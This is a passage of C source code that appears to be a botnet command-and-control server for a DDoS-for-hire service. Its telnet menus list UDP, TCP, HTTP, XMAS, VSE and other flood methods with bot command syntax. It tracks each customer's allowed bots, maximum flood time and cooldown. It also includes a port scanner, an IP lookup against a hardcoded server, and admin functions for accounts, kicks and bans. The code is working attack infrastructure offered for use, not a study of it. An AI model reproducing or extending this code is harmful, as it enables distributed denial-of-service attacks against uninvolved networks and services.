            sprintf(str, "\x1b[1;36m║ TOOLS   \x1b[90m- \x1b[0mShows Available Tools     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ SERVER  \x1b[90m- \x1b[0mShows ServerSide Commands \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ ADMIN   \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m╚═════════════════════════════════════╝\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
        }
        else if(!strcmp(buffer, "METHODS") || !strcmp(buffer, "methods")) 
        {           
            sprintf(str, "\x1b[1;36m╔════════════════════════════════════════════════════════════╗\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ UDP Flood \x1b[90m- \x1b[0m* "BOT_TRIGGER"UDP [IP] [PORT] [TIME] 32 0 10             \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ TCP Flood \x1b[90m- \x1b[0m* "BOT_TRIGGER"TCP [IP] [PORT] [TIME] 32 [FLAGS] 0 10     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ CNC Flood \x1b[90m- \x1b[0m* "BOT_TRIGGER"CNC [IP] [PORT] [TIME]                     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ RHex STD  \x1b[90m- \x1b[0m* "BOT_TRIGGER"STD [IP] [PORT] [TIME]                     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ RHex HTTP \x1b[90m- \x1b[0m* "BOT_TRIGGER"HTTP [URL] [PORT] [TIME] [THREADS] [METHOD]\x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;    
            sprintf(str, "\x1b[1;36m║ XMAS Flood \x1b[90m-\x1b[0m* "BOT_TRIGGER"XMAS [IP] [PORT] [TIME] 32 1024 10         \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;        
            sprintf(str, "\x1b[1;36m║ VSE Flood \x1b[90m- \x1b[0m* "BOT_TRIGGER"VSE [IP] [PORT] [TIME] 32 1024 10          \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end; 
            sprintf(str, "\x1b[1;36m╚════════════════════════════════════════════════════════════╝\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
        }
        else if(!strcmp(buffer, "* . UDP") || !strcmp(buffer, "* . TCP") || !strcmp(buffer, "* . CNC") || !strcmp(buffer, "* . STD") || !strcmp(buffer, "* . HTTP") || !strcmp(buffer, "* . XMAS") || !strcmp(buffer, "* . VSE"))
        {
        	sprintf(str, "\x1b[0m[Command Received!]");
        	if(send(myfd, str, strlen(str), 0) == -1) goto end;
        }
		else if(!strcmp(buffer, "tools") || !strcmp(buffer, "TOOLS"))
		{
			sprintf(str, "\x1b[1;36m╔════════════════════════════════════╗\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ IP Lookup \x1b[90m- \x1b[0m. IPLOOKUP [TARGET]    \x1b[1;36m║\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ Resolver \x1b[90m- \x1b[0m. RESOLVE [TARGET]      \x1b[1;36m║\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ Port Scanner \x1b[90m- \x1b[0m. PORTSCAN [TARGET] \x1b[1;36m║\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m╚════════════════════════════════════╝\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
		}
		else if(!strcmp(buffer, "SERVER") || !strcmp(buffer, "server")) 
        {           
            sprintf(str, "\x1b[1;36m╔═══════════════════════════════════╗\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ . CONNS \x1b[90m- \x1b[0mShows Bot Count/Arch    \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ . USERS? \x1b[90m- \x1b[0mShows Online Users     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ . STATS \x1b[90m- \x1b[0mShows Account Stats     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ . MSG \x1b[90m- \x1b[0mDirect Message a User     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║ . CHAT ON || . CHAT OFF           \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m║   CLS/CLEAR \x1b[90m- \x1b[0mClears Screen       \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            sprintf(str, "\x1b[1;36m╚═══════════════════════════════════╝\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
        }
				else if(!strcmp(buffer, "admin") || !strcmp(buffer, "ADMIN"))
		{
			if(managers[myfd].admin)
			{
        		sprintf(str, "\x1b[1;36m╔══════════════════════════════════════════════════╗\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . ADDUSER \x1b[90m- \x1b[0mCreate a Client Account              \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . DELUSER \x1b[90m- \x1b[0mDelete a Client Account              \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ \x1b[1;36m. KICK USER=[USER] || . KICK ID=[#]              \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . GENTOKEN \x1b[90m- \x1b[0mGenerate a New Token                \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . CHECKTOK \x1b[90m- \x1b[0mCheck a Token's Statistics          \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . UNMUTE \x1b[90m- \x1b[0mForces All Users Into Chat            \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . BLACKLIST \x1b[90m- \x1b[0mBlacklist a Host                   \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . RMBLACKLIST \x1b[90m- \x1b[0mRemove a Host from Blacklist     \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . BAN [IP] \x1b[90m- \x1b[0mBan an IPv4 from Raw Connection     \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . UNBAN [IP] \x1b[90m- \x1b[0mUnban an IPv4 from Raw Connection \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m║ . BANLIST \x1b[90m- \x1b[0mShows Banned Address                 \x1b[1;36m║\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
        		sprintf(str, "\x1b[1;36m╚══════════════════════════════════════════════════╝\x1b[0m\r\n");
        		if(send(myfd, str, strlen(str), 0) == -1) goto end;
      		}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Only admins can see this help menu!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(!strcmp(buffer, "clear") || !strcmp(buffer, "CLEAR") || !strcmp(buffer, "cls") || !strcmp(buffer, "CLS"))
		{
			if(send(myfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, "\x1b[1;36m               ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔              \x1b[0m \r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, "\x1b[0m               ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, "\x1b[90m               ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝  \x1b[1;36mv3          \x1b[0m \r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, "\x1b[1;36m          ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n");;
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, "\x1b[1;36m          ║\x1b[90m- - - - - \x1b[1;36m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, "\x1b[1;36m          ║\x1b[90m- - - - - \x1b[0mType \x1b[1;36mHELP \x1b[0mfor \x1b[1;36mCommands List \x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, "\x1b[1;36m          ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
		}
		else if(!strcmp(buffer, ". stats") || !strcmp(buffer, ". STATS"))
		{
			sprintf(str, "\x1b[0m[\x1b[1;36m+\x1b[0m]---- \x1b[1;36mAccount Statistics \x1b[0m[\x1b[1;36m+\x1b[0m]\x1b[37m\r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, INFO" \x1b[1;36mAccount Expiry - \x1b[1;33m%s\x1b[37m\r\n", managers[myfd].expire);
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			if(botsOnline() > managers[myfd].maxbots)
			{
				sprintf(str, INFO" \x1b[1;36mBot Access - \x1b[1;33m%d\x1b[37m\r\n", managers[myfd].maxbots);
				if(send(myfd, str, strlen(str), 0) == -1) goto end;
			}
			else
			{
				sprintf(str, INFO" \x1b[1;36mBot Access - \x1b[1;33m%d\x1b[37m\r\n", botsOnline());
				if(send(myfd, str, strlen(str), 0) == -1) goto end;
			}
			sprintf(str, INFO" \x1b[1;36mMax Flood Time - \x1b[1;33m%d\x1b[37m\r\n", managers[myfd].maxseconds);
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			sprintf(str, INFO" \x1b[1;36mCooldown - \x1b[1;33m%d\x1b[37m\r\n", managers[myfd].cooldown);
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
		}
		else if(!strcmp(buffer, ". USERS?") || !strcmp(buffer, ". users?"))
		{
			int x;
			sprintf(str, "\x1b[0m[\x1b[1;36m+\x1b[0m]---- \x1b[1;36mOnline Users \x1b[0m----[\x1b[1;36m+\x1b[0m]\x1b[37m\r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			for(x=0; x < MAXFDS; x++)
			{
				if(!managers[x].connected) continue;
				if(managers[myfd].admin && !managers[x].admin)
					sprintf(str, "\x1b[1;36mID(\x1b[33m%d\x1b[1;36m) %s \x1b[1;32m| \x1b[1;33m%s\x1b[37m\r\n", x, managers[x].username, managers[x].ip);
				else
					sprintf(str, "\x1b[1;36mID(\x1b[33m%d\x1b[1;36m) %s\x1b[37m\r\n", x, managers[x].username);
				if(send(myfd, str, strlen(str), 0) == -1) goto end;
			}
		}
		else if(strstr(buffer, ". ban ") || strstr(buffer, ". BAN "))
		{
			if(managers[myfd].admin)
			{
				char *banip = buffer+strlen(". ban ");
				trim(banip);
				if(strlen(banip) >= 7)
				{
					int lol;
					for(lol=0; lol < MAXFDS; lol++)
					{
						if(!strcmp(managers[lol].ip, banip))
						{
							int kok = 0;
							keklolkek:
							if(strlen(console[kok].banned) > 2)
							{
								kok++;
								goto keklolkek;
							}
							else
							{
								snprintf(console[kok].banned, sizeof(console[kok].banned), "%s", managers[lol].ip);
								snprintf(console[kok].bannedlog, sizeof(console[kok].bannedlog), "%s:%s", managers[lol].username, managers[lol].ip);
								sprintf(str, "Banned %s:%s!\r\n", managers[lol].username, managers[lol].ip);
								if(send(myfd, str, strlen(str), 0) == -1) goto end;
								printf("%s banned %s!\n", managers[myfd].username, managers[lol].username);
								managers[lol].connected = 0;
								memset(managers[lol].ip, 0, sizeof(managers[lol].ip));
								memset(managers[lol].username, 0, sizeof(managers[lol].username));
								memset(managers[lol].expire, 0, sizeof(managers[lol].expire));
								memset(managers[lol].inputprompt, 0, sizeof(managers[lol].inputprompt));
								close(lol);
							}
						}
					}
				}
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(strstr(buffer, ". unban ") || strstr(buffer, ". UNBAN "))
		{
			if(managers[myfd].admin)
			{
				char *unbanip = buffer+strlen(". unban ");
				if(strlen(unbanip) >= 7)
				{
					int j;
					for(j=0; j < MAXFDS; j++)
					{
						if(strlen(console[j].banned) > 1)
						{
							if(!strcmp(console[j].banned, unbanip))
							{
								memset(console[j].banned, 0, sizeof(console[j].banned));
								memset(console[j].bannedlog, 0, sizeof(console[j].bannedlog));
								sprintf(str, "Unbanned %s!\r\n", unbanip);
								if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
							}
						}
					}
				}
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(!strcmp(buffer, ". banlist") || !strcmp(buffer, ". BANLIST"))
		{
			if(managers[myfd].admin)
			{
				sprintf(str, "\x1b[32m---- \x1b[36mBanned Users \x1b[32m----\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				int k;
				for(k=0; k < MAXFDS; k++)
				{
					if(strlen(console[k].bannedlog) > 1)
					{
						sprintf(str, "\x1b[33m%s\x1b[37m\r\n", console[k].bannedlog);
						if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
					}
				}
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
				else if(strstr(buffer, ". CHAT "))
		{
			char *option = buffer+strlen(". CHAT ");
			trim(option);
			if(!strcmp(option, "ON"))
			{
				if(managers[myfd].mute)
				{
					managers[myfd].mute = 0;
					sprintf(str, "\x1b[1;33mJoined Chat!\x1b[37m\r\n");
					if(send(myfd, str, strlen(str), 0) == -1) goto end;
				}
				else if(!managers[myfd].mute)
				{
					sprintf(str, "\x1b[1;33mChat Already Enabled.\x1b[37m\r\n");
					if(send(myfd, str, strlen(str), 0) == -1) goto end;
				}
			}
			else if(!strcmp(option, "OFF"))
			{
				if(!managers[myfd].mute)
				{
					managers[myfd].mute = 1;
					sprintf(str, "\x1b[1;33mLeft Chat!\x1b[37m\r\n");
					if(send(myfd, str, strlen(str), 0) == -1) goto end;
				}
				else if(managers[myfd].mute)
				{
					sprintf(str, "\x1b[1;33mChat Already Disabled.\x1b[37m\r\n");
					if(send(myfd, str, strlen(str), 0) == -1) goto end;
				}
			}
		}
		else if(!strcmp(buffer, ". UNMUTE") || !strcmp(buffer, ". unmute"))
		{
			if(managers[myfd].admin)
			{
				int cfd;
				for(cfd=0; cfd < MAXFDS; cfd++)
				{
					if(managers[cfd].connected)
						managers[cfd].mute = 0;
				}
				sprintf(str, "\x1b[33m%s, You Have Unmuted All Users!\r\n", managers[myfd].username);
				if(send(myfd, str, strlen(str), 0) == -1) goto end;
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(strstr(buffer, ". kick ") || strstr(buffer, ". KICK "))
        {
            if(managers[myfd].admin)
            {
                // ex1: . kick user=username
                // ex2: . kick id=5
                if(strstr(buffer, "user=") || strstr(buffer, "USER="))
                {
                    int id;
                    char *user = buffer+strlen(". kick user=");
                    trim(user);
                    for(id=0; id < MAXFDS; id++)
                    {
                        if(strstr(managers[id].username, user))
                        {
                            sprintf(str, "\n\x1b[31mGoodbye, kicked by \x1b[1;36m%s\x1b[0m...\r\n", managers[myfd].username);
                            if(send(id, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                            managers[id].connected = 0;
                            close(id);
                            //managesConnected -= 1;
                            sprintf(str, "\x1b[1;36mKicked \x1b[1;36m%s\x1b[0m...\r\n", user);
                            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
                else if(strstr(buffer, "id=") || strstr(buffer, "ID="))
                {
                    int uid = atoi(buffer+strlen(". kick id="));
                    sprintf(str, "\n\x1b[31mGoodbye, kicked by \x1b[1;36m%s\x1b[0m...\r\n", managers[myfd].username);
                    if(send(uid, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                    managers[uid].connected = 0;
                    close(uid);
                    //managesConnected -= 1;
                    sprintf(str, "\x1b[1;36mKicked user with ID # \x1b[1;36m%d\x1b[0m...\r\n", uid);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
            }
            else
            {
                sprintf(str, "KICK - \x1b[31mPermission Denied!\x1b[0m\r\n");
                if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                
            }
        }
		else if(strstr(buffer, ". iplookup ") || strstr(buffer, ". IPLOOKUP "))
        {
            char *myhost = buffer+strlen(". iplookup ");
			trim(myhost);
            if(strlen(myhost) >= 7)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "104.197.45.208"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
                    sprintf(str, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\x1b[0m\r\n", myhost);
                    if(send(myfd, str, strlen(str), 0) == -1) goto end;
                }
                else
                {
                    //printf("[\x1b[32m+\x1b[37m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[37m] Sent request headers to iplookup api!\n");
                        sprintf(str, "\x1b[0m[\x1b[1;36mIPLookup\x1b[0m] \x1b[1;36mGetting Info For -> %s...\r\n", myhost);
                        if(send(myfd, str, strlen(str), 0) == -1) goto end;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[37m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(str, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(str, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n");
                        else sprintf(str, "\x1b[1;36m[+]--- \x1b[0mResults\x1b[1;36m ---[+]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer);
                        if(send(myfd, str, strlen(str), 0) == -1) goto end;
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[37m] Failed to send request headers...\n");
                        sprintf(str, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(myfd, str, strlen(str), 0) == -1) goto end;
                    }
                }
                close(IPLSock);
            }
        }
        else if(strstr(buffer, ". PORTSCAN ") || strstr(buffer, ". portscan "))
        {
            int x;
            int ps_timeout = 1; // usually set this as 2 or 3 but 1 is faster since theres going to be customers
            int least_port = 1; // this is the least number we want to set
            int max_port = 7000; // this is the max port we want to check
            trim(buffer);
            char *host = buffer+strlen(". portscan ");
			trim(host);
            snprintf(str, sizeof(str), "\x1b[1;36m[\x1b[0mPortscanner\x1b[1;36m] \x1b[0mChecking ports \x1b[1;36m%d-%d \x1b[0mon -> \x1b[1;36m%s...\x1b[0m\r\n", least_port, max_port, host);
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                // set timeout secs
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0); // create our tcp socket
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(str, sizeof(str), "\x1b[1;36m[\x1b[0mPortscanner\x1b[1;36m] %d \x1b[0mis open on \x1b[1;36m%s!\x1b[0m\r\n", x, host);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                    memset(str, 0, sizeof(str));
                    close(Sock);
                }
            }
            snprintf(str, sizeof(str), "\x1b[1;36m[\x1b[0mPortscanner\x1b[1;36m] \x1b[32mScan on \x1b[1;36m%s \x1b[32mfinished.\x1b[0m\r\n", host);
            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
        }
		else if(!strcmp(buffer, ". blacklist") || !strcmp(buffer, ". BLACKLIST"))
		{
			char blipv4[18];
			if(managers[myfd].admin)
			{
				sprintf(str, "IPv4: ");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				while(fdgets(blipv4, sizeof blipv4, myfd) < 1)
				{
					trim(blipv4);
					if(strlen(blipv4) < 3) continue;
					break;
				}
				trim(blipv4);
				int xyy;
				for(xyy=0; xyy < MAXFDS; xyy++)
				{
					if(strlen(console[xyy].blacklist) < 1)
					{
						snprintf(console[xyy].blacklist, sizeof(console[xyy].blacklist), "%s", blipv4);
						sprintf(str, "\x1b[1;36m%s, You've Blacklisted \x1b[31m%s\x1b[1;36m!\x1b[0m\r\n", managers[myfd].username, blipv4);
						if(send(myfd, str, strlen(str), 0) == -1) goto end;
						break;
					}
				}
				memset(blipv4, 0, sizeof(blipv4));
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(!strcmp(buffer, ". rmblacklist") || !strcmp(buffer, ". RMBLACKLIST"))
		{
			char blipv4[18];
			if(managers[myfd].admin)
			{
				sprintf(str, "IPv4: ");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				while(fdgets(blipv4, sizeof blipv4, myfd) < 1)
				{
					trim(blipv4);
					if(strlen(blipv4) < 3) continue;
					break;
				}
				trim(blipv4);
				int xyy;
				for(xyy=0; xyy < MAXFDS; xyy++)
				{
					if(!strcmp(console[xyy].blacklist, blipv4))
					{
						memset(console[xyy].blacklist, 0, sizeof(console[xyy].blacklist));
						sprintf(str, "\x1b[1;36m%s, You've Un-Blacklisted \x1b[31m%s\x1b[1;36m!\x1b[0m\r\n", managers[myfd].username, blipv4);
						if(send(myfd, str, strlen(str), 0) == -1) goto end;
						break;
					}
				}
				memset(blipv4, 0, sizeof(blipv4));
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(!strcmp(buffer, ". msg") || !strcmp(buffer, ". MSG"))
		{
			int pmfd, sent = 0;
			char pmuser[50];
			char privmsg[1024];
			sprintf(str, "\x1b[0m[\x1b[1;36mDirect Message\x1b[0m]\r\n\x1b[1;36mUsername: \x1b[0m");
			if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			while(fdgets(pmuser, sizeof pmuser, myfd) < 1)
			{
				trim(pmuser);
				if(strlen(pmuser) < 3) continue;
				break;
			}
			trim(pmuser);
			sprintf(str, "\x1b[1;36mMessage: \x1b[0m");
			if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			while(fdgets(privmsg, sizeof privmsg, myfd) < 1)
			{
				trim(privmsg);
				if(strlen(privmsg) < 3) continue;
				break;
			}
			trim(privmsg);
			for(pmfd=0; pmfd < MAXFDS; pmfd++)
			{
				if(managers[pmfd].connected)
				{
					if(!strcmp(managers[pmfd].username, pmuser))
					{
						sprintf(str, "\x1b[1;36mMessage from \x1b[1;33m%s\x1b[1;36m: %s\x1b[37m\r\n", managers[myfd].username, privmsg);
						if(send(pmfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
						if(send(pmfd, managers[pmfd].inputprompt, strlen(managers[pmfd].inputprompt), MSG_NOSIGNAL) == -1) return;
						sent = 1;
					}
				}
			}
			if(sent && pmuser != NULL)
			{
				sprintf(str, "\x1b[1;36mMessage Sent To \x1b[1;33m%s\x1b[37m\r\n", pmuser);
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				sent = 0;
			}
			else if(!sent)
			{
				sprintf(str, "\x1b[31mCouldn't Find \x1b[33m%s\x1b[37m\r\n", pmuser);
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(!strcmp(buffer, ". adduser") || !strcmp(buffer, ". ADDUSER"))
		{
			if(managers[myfd].admin)
			{
				int ret;
				char new_user[40];
				char new_pass[40];
				char new_type[40];
				int new_typee;
				char new_expire[40];
				char new_bots[10];
				char new_seconds[10];
				char new_cd[10];
				int new_bc, new_secs, new_cooldown;
				readduser:
		        if(send(myfd, "\x1b[1;36mUsername: \x1b[37m", strlen("\x1b[1;36mUsername: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(new_user, 0, sizeof(new_user));
		        while(ret = read(myfd, new_user, sizeof(new_user)))
				{
					new_user[ret] = '\0';
					trim(new_user);
					if(strlen(new_user) < 3) continue;
					break;
				}
				trim(new_user);
				int kdm;
				for(kdm=0; kdm < MAXFDS; kdm++)
				{
					if(!strcmp(accounts[kdm].username, new_user))
					{
						sprintf(str, "\x1b[31mThe Username \x1b[1;36m%s\x1b[31m is Already Taken...\x1b[37m\r\n", new_user);
						if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) goto end;
						goto readduser;
					}
				}
				sleep(0.5);
